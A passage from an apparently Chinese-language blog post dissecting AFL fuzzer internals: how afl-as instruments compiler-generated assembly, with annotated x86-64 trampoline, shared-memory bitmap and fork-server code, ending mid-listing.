afl-as.c</h4><ul><li><p>由前所述，<code>afl-gcc/clang/g++/clang++/gcj</code>通过<code>-B</code>参数指定了<code>AFL的汇编器</code>路径，那么在gcc/g++/clang/clang++/gcj生成目标文件/可执行文件的过程中，将使用afl-as作为其编译器，而afl-as本身也是as一个wrapper：</p><ul><li>先对编译器产生的汇编文件进行<strong>插桩</strong></li><li>然后再调用系统的<code>as</code>来<strong>生成相应的机器码</strong></li></ul></li><li><p><span class="github-emoji"><span>💭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f4ad.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 但是这样一来无法对<code>afl-as</code>进行调试？</p><ul><li><p>经过对<code>afl-as</code>的简单分析，我们可以先通过<code>afl-gcc -S</code>生成汇编文件，然后将汇编文件放置在<code>tmp</code>目录下</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ afl-gcc -S afl_inst_test.c -o afl_inst_test.s<br>afl-cc 2.57b by &lt;lcamtuf@google.com&gt;<br>afl_inst_test.c: In <span class="hljs-keyword">function</span> ‘main’:<br>afl_inst_test.c:12:2: warning: ignoring <span class="hljs-built_in">return</span> value of ‘scanf’, declared with attribute warn_unused_result [-Wunused-result]<br>  scanf(<span class="hljs-string">"%d"</span>, &amp;a);<br>  ^~~~~~~~~~~~~~~<br>$ <span class="hljs-built_in">mv</span> afl_inst_test.s /tmp<br></code></pre></td></tr></tbody></table></figure></li><li><p>使用<code>afl-as</code>对上述产生的汇编文件进行汇编操作：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /home/chan/some_c_test/AFLAPI/afl-as -o afl_inst_test.o /tmp/afl_inst_test.s<br>afl-as 2.57b by &lt;lcamtuf@google.com&gt;<br>[+] Instrumented 4 locations (64-bit, non-hardened mode, ratio 100%).<br></code></pre></td></tr></tbody></table></figure><p>:happy:由上述的结果，我们可以看出该汇编文件已经成功插桩了。但这里我们无法捕获到插桩后的汇编文件，因此需要对<code>afl-as</code>进行debug。</p></li></ul></li><li><p><strong>源码解析</strong>：</p><p>一些局部变量：inst_ratio_str =&gt; <strong>inst_ratio</strong> [默认为100，插桩率 0~100]；<strong>sanitizer</strong> [是否启用ASAN/MSAN?] </p><ul><li><p><code>srandom()</code>：置时间种子，种子由当前时间的秒、微秒和进程pid异或得到</p></li><li><p><code>edit_params()</code>：构造汇编所使用的命令行</p><ul><li><p>环境变量<code>TMPDIR</code>可以自定义临时文件夹，此外，环境变量<code>TEMP</code>和<code>TMP</code>同样有相同的功能，否则<code>tmp_dir</code>默认为”<code>/tmp</code>“，这也是我们之前将汇编文件放置在<code>tmp</code>目录下的原因 <span class="github-emoji"><span>✋</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/270b.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p></li><li><p>然后将原<code>argv</code>【前 <code>argc-1</code> 个选项】拷贝到<code>as_params[]</code>中。这里检测原命令行中是否出现<code>"--64"</code> / <code>"--32"</code>  =&gt; 将<code>use_64bit</code>标志变量相应的设置为1 / 0</p><p><span class="github-emoji"><span>⚠</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/26a0.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 注：在调用<code>afl-as</code>时，必须将输入文件放置在最后，即<code>afl-as -o xxx.o xxx.s</code><span class="github-emoji"><span>✔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2714.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，<code>afl-as xxx.s -o xxx.o</code><span class="github-emoji"><span>❌</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/274c.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> </p><p><code>input_file = argv[argc - 1] // xxx.s</code></p></li><li><p>判断<code>input_file</code>是否在<code>/tmp</code>或<code>/var/tmp</code>，如果不再则将<code>pass_thru</code>置为1【这会导致后面不进行插桩操作】</p><p><code>modified_file</code>为插桩后汇编文件，这里根据时间和pid随机分配一个名字，如<code>/tmp/.afl-4270-1669033267.s</code></p><p>然后将<code>modified_file</code>添加到<code>as_params</code>最后，作为汇编器的输入文件！</p></li></ul></li><li><p>如果设置了环境变量<code>AFL_USE_ASAN</code>或<code>AFL_USE_MSAN</code>，将sanitizer置为1，且将<strong>插桩率inst_ratio除以3</strong></p><p><span class="github-emoji"><span>❓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2753.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 这里为啥要将<code>inst_ratio</code>除以3？</p><blockquote><p>源码注释中作者这样描述：</p><p>“在使用ASAN编译时，没有一个特别优雅的方法跳过ASAN特有的分支，但可以通过插桩率上进行补偿…”</p><p>见解：<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ASAN会引入由ASAN所导致的特定分支，而如前所述，ASAN插桩是在编译过程完成的，而AFL在编译器生成的汇编基础上进行插桩，因此会对ASAN本身特定的分支进行插桩。概率插桩（33%）在一定程度上能够反映软件的真实覆盖率大小。</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ASAN的插桩是<strong>重量级</strong>的，因此ASAN引入的边可能会导致比特位图碰撞性提升，而概率插桩能够解决这一问题</p></blockquote></li><li><p><code>add_instrumentation()</code>：对汇编文件进行<strong>插桩</strong>（分支处插桩 + 相关调用函数）</p><ul><li><p>如果<code>input_file</code>文件不能打开，则将<code>stdin</code>作为输入；<code>modified_file</code>作为输出文件；</p></li><li><p>【<strong>分支处插桩</strong>】读取<code>input_file</code>中的每一行，并做一系列的判断，其主要找到三个位置：</p><ul><li><strong>函数头：</strong></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">function_name:<br>.LFB23:<br>.file 1 "afl_inst_test.c"<br>.loc 1 3 0<br>.cfi_startproc<br>.LVL0:<br>.loc 1 5 0<br># &lt;&lt;======== instrumentation here<br>movl%edi, %eax<br></code></pre></td></tr></tbody></table></figure><ul><li><strong>jx/jxx的两条分支：</strong></li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># branch 1<br>.LVL7:<br>.loc 1 14 0<br>movl4(%rsp), %edx<br>cmpl$0, %edx<br>jg.L11<br># &lt;&lt;======== instrumentation here<br>.loc 1 16 0<br>jne.L12<br># &lt;&lt;======== instrumentation here<br>...<br># branch 2<br>.L11:<br>.cfi_restore_state<br>.LVL10:<br>.LBB26:<br>.LBB27:<br>.loc 2 104 0<br># &lt;&lt;======== instrumentation here<br>leaq.LC2(%rip), %rsi<br>movl$1, %edi<br>xorl%eax, %eax<br>call__printf_chk@PLT<br>.LVL11:<br>jmp.L7<br>.LVL12:<br>.L12:<br>.LBE27:<br>.LBE26:<br>.LBB28:<br>.LBB29:<br># &lt;&lt;======== instrumentation here<br>leaq.LC3(%rip), %rsi<br>movl$1, %edi<br>xorl%eax, %eax<br>call__printf_chk@PLT<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 汇编中<code>.</code>开头标识的意义 [16]：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>.loc</code>：**Line Of Code [-g?]**，格式为 <code>.loc 文件序号 行序号 [列] [选项]</code>，在上示例中，<code>.loc 1 14 0</code>表示file 1：afl_inst_test.c，第14行第0列 [17]</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> GCC使用<code>.L</code>用于<strong>本地标签</strong></p><blockquote><p>本地符号是以某种本地标签前缀开头的任何符号，默认情况下，ELF系列的本地标签前缀是“.L”</p><p>本地符号在汇编器中被定义和使用，但它们通常不被保存在目标文件中。因此在调试时它们是不可见的。可以使用<code>-L</code>选项保留目标文件中的本地符号 [18]</p><p>e.g.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;/tmp$ as -c -L afl_inst_test.s <span class="hljs-comment"># you can also use `as --keep-locals -c afl_inst_test.s`</span><br>&gt;/tmp$ nm a.out<br>&gt;0000000000000000 T fun<br>      U _GLOBAL_OFFSET_TABLE_<br>      U __isoc99_scanf<br>&gt;000000000000006d t .L11<br>&gt;0000000000000082 t .L12<br>&gt;0000000000000097 t .L13<br>&gt;...<br>&gt;/tmp$ as -c afl_inst_test.s <br>&gt;/tmp$ nm a.out<br>&gt;0000000000000000 T fun<br>      U _GLOBAL_OFFSET_TABLE_<br>      U __isoc99_scanf<br>&gt;0000000000000000 r .LC0<br>&gt;0000000000000000 r .LC1<br>&gt;0000000000000003 r .LC2<br>&gt;000000000000001c r .LC3<br>&gt;0000000000000035 r .LC4<br>&gt;0000000000000000 T main<br>      U __printf_chk<br>      U __stack_chk_fail<br>&gt;/tmp$ <br></code></pre></td></tr></tbody></table></figure></blockquote><p><span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>.L</code><strong>前缀</strong>（是DWARF调试信息，不重要）：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUNC_BEGIN_LABEL  <span class="hljs-string">"LFB"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUNC_END_LABEL    <span class="hljs-string">"LFE"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BLOCK_BEGIN_LABEL <span class="hljs-string">"LBB"</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BLOCK_END_LABEL   <span class="hljs-string">"LBE"</span></span><br>ASM_GENERATE_INTERNAL_LABEL (loclabel, <span class="hljs-string">"LVL"</span>, loclabel_num);<br></code></pre></td></tr></tbody></table></figure><p>LFB：函数开始； LFE：函数结束；LBB：块开始；LBE：块结束；LVL：尚不知</p><p>详见 [19]</p></li><li><p>【相关调用函数的附加】最后，将<code>main_payload_64</code>或<code>main_payload_32</code>添加到汇编文件的末尾处。至此，所有的插桩过程均已完成！</p></li></ul></li><li><p><code>execvp()</code>：<code>fork</code>一个子进程执行构造的新的<code>as_params</code>，即对插桩后的汇编文件进行汇编操作。最后删除临时文件 [<code>modified_file</code>]，至此，汇编任务完成</p></li></ul></li></ul><h4 id="3-afl-as-h-桩代码解析"><a href="#3-afl-as-h-桩代码解析" class="headerlink" title="3. afl-as.h (桩代码解析)"></a>3. afl-as.h (桩代码解析)</h4><ul><li>主要有两个桩代码：<span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>trampoline_fmt_64/trampoline_fmt_32</code>；<span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>main_payload_64/main_payload_32</code>；</li></ul><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>trampoline_fmt_64/trampoline_fmt_32</code>（以64位为例）：</p><ul><li>汇编码：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/* --- AFL TRAMPOLINE (64-BIT) --- */<br><br>.align 4<br><br>leaq -(128+24)(%rsp), %rsp # 分配152字节的栈空间<br>movq %rdx,  0(%rsp) # 保存现场<br>movq %rcx,  8(%rsp)<br>movq %rax, 16(%rsp)<br>movq $0x%08x, %rcx    /* %08x是一个比特位图大小内的随机数 */<br>call __afl_maybe_log<br>movq 16(%rsp), %rax # 恢复现场<br>movq  8(%rsp), %rcx<br>movq  0(%rsp), %rdx<br>leaq (128+24)(%rsp), %rsp # 复原栈<br><br>/* --- END --- */<br></code></pre></td></tr></tbody></table></figure><ul><li>上述汇编码调用了<code>__afl_maybe_log(%rcx[i.e.当前分支对应的随机数])</code>来记录边的情况</li></ul><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>main_payload_64/main_payload_32</code>（以64位为例）：</p><ul><li>汇编码主要包括10个函数，分别是：<code>__afl_maybe_log</code>、<code>__afl_store</code>、<code>__afl_return</code>、<code>__afl_setup</code>、<code>__afl_setup_first</code>、<code>__afl_forkserver</code>、<code>__afl_fork_wait_loop</code>、<code>__afl_fork_resume</code>、<code>__afl_die</code>、<code>__afl_setup_abort</code></li><li><code>__afl_maybe_log</code>、<code>__afl_store</code>、<code>__afl_return</code>：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_maybe_log:<br><br>  lahf   # save other flags to AH<br>  seto  %al   # set OF to al<br><br>  /* Check if SHM region is already mapped. */<br><br>  movq  __afl_area_ptr(%rip), %rdx # __afl_area_ptr是共享的bitmap位图内存块<br>  testq %rdx, %rdx<br>  je    __afl_setup   # je =&gt; jz 即判断该地址是否为0；如果为0，则进行初始化<br>  <br>__afl_store:<br><br>  /* Calculate and store hit for the code location specified in rcx. */<br><br>  xorq __afl_prev_loc(%rip), %rcx  # %rcx = pre ^ cur<br>  xorq %rcx, __afl_prev_loc(%rip)  # __afl_prev_loc = pre ^ cur ^ pre = cur<br>  shrq $1, __afl_prev_loc(%rip)    # __afl_prev_loc = cur &gt;&gt; 1<br>  # (pre &gt;&gt; 1) ^ cur<br>  incb (%rdx, %rcx, 1)             # __afl_area_ptr[%rcx] = __afl_area_ptr[%rcx] + 1<br><br>__afl_return:<br><br>  addb $127, %al   # restore OF (if OF=1, al+127=128 =&gt; OF=1 else OF=0)<br>  sahf   # restore other flags<br>  ret<br></code></pre></td></tr></tbody></table></figure><ul><li><code>__afl_setup</code>：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.align 8<br><br>__afl_setup:<br><br>  /* Do not retry setup if we had previous failures. */<br><br>  cmpb $0, __afl_setup_failure(%rip)  # 变量__afl_setup_failure如果为0，表示之前配置没问题，否则表示之前出错了，那么返回<br>  jne __afl_return<br><br>  /* Check out if we have a global pointer on file. */<br><br>  movq  __afl_global_area_ptr@GOTPCREL(%rip), %rdx  # 将__afl_global_area_ptr移送到%rdx<br>  movq  (%rdx), %rdx    # 将%rdx指向的值赋值给%rdx<br>  testq %rdx, %rdx# 判断%rdx是否为0，如果为0，表明未进行初始化操作<br>  je    __afl_setup_first# 跳转到__afl_setup_first进行初始化操作<br><br>  movq %rdx, __afl_area_ptr(%rip)# 将全局指针赋值给__afl_area_ptr<br>  jmp  __afl_store# 更新全局边计数<br><br></code></pre></td></tr></tbody></table></figure><ul><li><code>__afl_setup_first</code>、<code>__afl_forkserver</code>、<code>__afl_fork_resume</code>和<code>__afl_die</code>：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_setup_first:<br><br>  /* Save everything that is not yet saved and that may be touched by<br>     getenv() and several other libcalls we'll be relying on. */<br><br>  leaq -352(%rsp), %rsp<br>  <br>  # 保护现场<br>  movq %rax,   0(%rsp)<br>  movq %rcx,   8(%rsp)<br>  movq %rdi,  16(%rsp)<br>  movq %rsi,  32(%rsp)<br>  movq %r8,   40(%rsp)<br>  movq %r9,   48(%rsp)<br>  movq %r10,  56(%rsp)<br>  movq %r11,  64(%rsp)<br><br>  movq %xmm0,  96(%rsp)<br>  movq %xmm1,  112(%rsp)<br>  movq %xmm2,  128(%rsp)<br>  movq %xmm3,  144(%rsp)<br>  movq %xmm4,  160(%rsp)<br>  movq %xmm5,  176(%rsp)<br>  movq %xmm6,  192(%rsp)<br>  movq %xmm7,  208(%rsp)<br>  movq %xmm8,  224(%rsp)<br>  movq %xmm9,  240(%rsp)<br>  movq %xmm10, 256(%rsp)<br>  movq %xmm11, 272(%rsp)<br>  movq %xmm12, 288(%rsp)<br>  movq %xmm13, 304(%rsp)<br>  movq %xmm14, 320(%rsp)<br>  movq %xmm15, 336(%rsp)<br><br>  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */<br><br>  /* The 64-bit ABI requires 16-byte stack alignment. We'll keep the<br>     original stack ptr in the callee-saved r12. */<br><br>  pushq %r12<br>  movq  %rsp, %r12# 将%rsp暂存到%r12中<br>  subq  $16, %rsp# 为%rsp分配16字节的空间<br>  andq  $0xfffffffffffffff0, %rsp   # %rsp最后四位清空变为0 ==&gt; 栈地址对齐到16字节（地址是16的整数倍）<br><br>  leaq .AFL_SHM_ENV(%rip), %rdi# 将字符串"__AFL_SHM_ID"地址保存到%rdi<br>call getenv@PLT# 调用getenv，即getenv("__AFL_SHM_ID")<br><br>  testq %rax, %rax# getenv返回值将移送到$rax，这里判断rax是否为0，如果返回值为0则跳转到__afl_setup_abort<br>  je    __afl_setup_abort<br><br>  movq  %rax, %rdi# 将getenv返回的字符串地址移送到%rdi(第一个参数)<br>call atoi@PLT# 调用atoi将环境变量__AFL_SHM_ID的值转为整型，返回的整型值保存在%rax中<br><br>  xorq %rdx, %rdx   /* shmat flags    */<br>  xorq %rsi, %rsi   /* requested addr */<br>  movq %rax, %rdi   /* SHM ID         */<br>call shmat@PLT# 调用shmat(shmid --&gt; %rdi = %rax[atoi返回值], shmaddr --&gt; %rsi = 0, shmflg --&gt; %rdx = 0)<br><br>  cmpq $-1, %rax# 返回 -1 表示shmat调用失败，则跳转到__afl_setup_abort<br>  je   __afl_setup_abort<br><br>  /* Store the address of the SHM region. */<br><br>  movq %rax, %rdx# %rax保存着返回的共享地址<br>  movq %rax, __afl_area_ptr(%rip)   # %rax保存到__afl_area_ptr变量中<br><br>  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx  # __afl_global_area_ptr指针移送到%rdx<br>  movq %rax, (%rdx)# 将返回的共享地址移送到__afl_global_area_ptr指针所指向的值<br>  movq %rax, %rdx# 将返回的地址保存到%rdx中<br>  <br>__afl_forkserver:<br>  /* Enter the fork server mode to avoid the overhead of execve() calls. We<br>     push rdx (area ptr) twice to keep stack alignment neat. */<br><br>  pushq %rdx<br>  pushq %rdx<br><br>  /* Phone home and tell the parent that we're OK. (Note that signals with<br>     no SA_RESTART will mess it up). If this fails, assume that the fd is<br>     closed because we were execve()d from an instrumented binary, or because<br>     the parent doesn't want to use the fork server. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $(198 + 1), %rdi       /* file desc */<br>call write@PLT# 调用write(198, __afl_temp, 4)<br><br>  cmpq $4, %rax# 返回值保存到%rax中，如果%rax == 4，表明写入成功<br>  jne  __afl_fork_resume# 如果通信失败，则跳转到__afl_fork_resume<br><br>__afl_fork_wait_loop:<br><br>  /* Wait for parent by reading from the pipe. Abort if read fails. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $198, %rdi             /* file desc */<br>call read@PLT# 调用read(198, __afl_temp, 4)<br>  cmpq $4, %rax# 返回值保存到%rax中，如果%rax == 4，表明读入成功<br>  jne  __afl_die# 否则跳转到__afl_die中<br><br>  /* Once woken up, create a clone of our process. This is an excellent use<br>     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly<br>     caches getpid() results and offers no way to update the value, breaking<br>     abort(), raise(), and a bunch of other things :-( */<br><br>call fork@PLT# 调用fork()<br>  cmpq $0, %rax# 判断fork()的返回值 (=0 ==&gt; 子进程， &lt;0 ==&gt; 失败， &gt;0 ==&gt; 在主进程中返回子进程PID)<br>  jl   __afl_die# 如果&lt;0(失败) 则跳转到__afl_die中<br>  je   __afl_fork_resume# 如果=0() 位于子进程中，则跳转到__afl_fork_resume<br><br>  /* In parent process: write PID to pipe, then wait for child. */<br><br>  movl %eax, __afl_fork_pid(%rip)# 【该分支位于父进程中】 %eax为fork()返回的子进程PID值，保存到__afl_fork_pid中<br><br>  movq $4, %rdx                   /* length    */<br>  leaq __afl_fork_pid(%rip), %rsi /* data      */<br>  movq $(198 + 1), %rdi             /* file desc */<br>call write@PLT# 调用write(199, &amp;__afl_fork_pid, 4);<br><br>  movq $0, %rdx                   /* no flags  */<br>  leaq __afl_temp(%rip), %rsi     /* status    */<br>  movq __afl_fork_pid(%rip), %rdi /* PID       */<br>call waitpid@PLT# 调用waitpid(__afl_fork_pid, __afl_temp, 0);<br>  cmpq $0, %rax# waitpid()返回值若≤0，则跳转到__afl_die<br>  jle  __afl_die<br><br>  /* Relay wait status to pipe, then loop back. */<br><br>  movq $4, %rdx               /* length    */<br>  leaq __afl_temp(%rip), %rsi /* data      */<br>  movq $(198 + 1), %rdi         /* file desc */<br>call write@PLT# 调用write(199, &amp;__afl_temp, 4);<br><br>  jmp  __afl_fork_wait_loop# 回到循环首<br>  <br>__afl_fork_resume:# 该分支为子进程操作<br><br>  /* In child process: close fds, resume execution. */<br><br>  movq $198, %rdi<br>call close@PLT# 调用close(198)<br><br>  movq $(198 + 1), %rdi<br>call close@PLT# 调用close(199)<br>  # 恢复现场！！<br>  popq %rdx<br>  popq %rdx<br><br>  movq %r12, %rsp<br>  popq %r12<br><br>  movq  0(%rsp), %rax<br>  movq  8(%rsp), %rcx<br>  movq 16(%rsp), %rdi<br>  movq 32(%rsp), %rsi<br>  movq 40(%rsp), %r8<br> 